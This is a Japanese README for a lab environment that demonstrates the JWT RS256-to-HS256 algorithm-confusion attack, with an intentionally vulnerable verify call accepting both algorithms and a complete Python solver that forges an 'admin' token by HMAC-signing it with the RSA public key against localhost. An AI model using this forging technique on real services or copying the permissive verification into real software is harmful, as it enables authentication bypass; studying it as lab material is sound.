# Trial2
アルゴリズムをRS256からHS256に変更する攻撃を検証するためのラボ環境。

[APIのソースコード](./index.js)

以下のエンドポイントが存在。
- サインインエンドポイント（`/signin`）
  - `username`と`password`を受け取り、該当のユーザーが存在するか確認。
  - `username`と`password`が正しければJWTを発行して返送する。
- flag取得エンドポイント（`/flag`）
  - JWTを受け取り、検証する。
  - 検証が成功し、`username`が`admin`の場合flagを返す。

## 解説
サインインエンドポイント（`/signin`）では認証が成功すると、アルゴリズムがRS256のJWTが発行される。

```js
signed = jwt.sign({
    username: username,
},
    readKeyFromFile("keys/private.key"), 
    { algorithm: "RS256", expiresIn: "1h" } 
);
```

flag取得エンドポイント（`/flag`）のJWT検証部分に脆弱性が存在。

検証時のアルゴリズムがHS256が許可されているため、アルゴリズムがHS256かつ共通鍵としてRS256の公開鍵を使用するJWTが受け入れられる状態になっている。

```js
verified = jwt.verify(
    req.header("Authorization"),
    readKeyFromFile("keys/public.key"),
    { algorithms: ["RS256", "HS256"] }
);
```

JWTのペイロードにおける`username`が`admin`の場合にflagが取得できる。

```js
if (verified.username === "admin") {
      res.send(`Congratulations! Here"s your flag: ${FLAG}`);
      return;
}
```

つまり、ペイロードにおける`username`が`admin`であり、アルゴリズムがHS256かつ共通鍵としてRS256の公開鍵を使用するJWTを作成して`/flag`に送信することでflagが取得できる。

以下の[solver](./solver.py)を実行することで、攻撃を検証可能。

PyJWTライブラリが古いバージョンの`0.4.3`でないと今回使用したいJWTが生成できないため、標準ライブラリを用いて実装している。

```py
import requests
import json
import base64
import hmac
import hashlib

HOST = "http://localhost:5503"

pubkey = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3NcjHBbKAAhJd6P+TviV
h/WRXtxtKBJLPQYIlmZ/I35WlQLpNXR9Q0YiQLMNW0E3MTHISQlQE5hBF8S2Z2tC
0SmiAMr3QQjaIA3vmefA/CXSp4YjIbKz75Nwzczk7spYiVwEbYoLOpovnl+KB6Tj
XJWCFXvgpL6xYu9Se8msgqVIl+cWANlmPdBuDRvF/7KUboHsdZsn1mL88JoTnk9u
sVp9PP+bpbcFEzwzfS+YkjwUhXFHHNPqsu9eKZZlpkRbl3lZzzxgX4G/bh3BkaCO
wp4Pv1ptk8NJH8N96USDw3Lpgc6wGReoyCBY7Dtg1a3IHNjQQwQg+rd+1yUUfPAe
qa9MbLWr3hYQn+9G4SxTwmWptGJLLjZMzfELtGxiZTHlnifP4nHSNJ8WdGJ63YU9
7LiwkWsE8BVIPi+f/oNIbhhgJzGSD57mkdN0wNloN0I+83/0g2TnVSvkSM5ow/E9
h2w/qaT9LfjtYiZbFFc95lwcaR1nUO/hmZ2okTt7Nh5tlefbvHNSyHMFuvTiEanI
xO2kJIXugy9h9pNAX8jlNHNQWT1WM5HI3t8aMcsucjOT9wTWh7Hl0qxrO4f7f2kP
HODGSRQ/uR9czPYtXP4HPAPUToZ9Xzc5Voj3Q/bzRcAnkKH6fmUOtLPd2XhTDTFl
A5kHBxj92CnlYq6/bQdXDy0CAwEAAQ==
-----END PUBLIC KEY-----"""

data = {
    "username": "guest",
    "password": "guest"
}

# /signin
signin_response = requests.post(f"{HOST}/signin", json=data)
print("/signin:", signin_response.text)
encoded_jwt = signin_response.headers['Authorization']
print("encoded jwt:", encoded_jwt)

# alg: HS256なJWTを作成
header = {
    "alg": "HS256",
    "typ": "JWT"
}

# Base64 encode the header and payload
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode('utf-8')
encoded_payload = base64.urlsafe_b64encode(json.dumps({"username": "admin"}).encode()).rstrip(b'=').decode('utf-8')

# Create the signature
message = f"{encoded_header}.{encoded_payload}"
signature = hmac.new(pubkey.encode(), message.encode(), hashlib.sha256)
encoded_signature = base64.urlsafe_b64encode(signature.digest()).rstrip(b'=').decode('utf-8')

# Combine to form the JWT
hs256_jwt = f"{encoded_header}.{encoded_payload}.{encoded_signature}"
print("HS256 jwt:", hs256_jwt)

# /flag
flag_response = requests.get(f"{HOST}/flag", headers={"Authorization": hs256_jwt})
print("/flag", flag_response.text)
```
